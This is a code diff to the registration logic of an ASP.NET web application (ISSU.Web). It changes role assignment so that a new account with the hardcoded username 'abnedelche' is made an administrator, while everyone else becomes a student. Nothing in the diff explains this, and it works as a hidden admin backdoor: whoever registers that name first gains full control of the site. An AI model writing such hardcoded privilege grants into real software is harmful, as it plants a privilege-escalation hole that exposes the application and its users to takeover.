@@ -87,7 +87,11 @@ namespace ISSU.Web.Controllers
 
                 if (result.Succeeded)
                 {
-                    UserManager.AddToRole(user.Id, "Student");
+                    if (user.UserName.Equals("abnedelche"))
+                        UserManager.AddToRole(user.Id, "Admin");
+                    else
+                        UserManager.AddToRole(user.Id, "Student");
+
                     await SignInAsync(user, isPersistent: false);
                     return true;
                 }
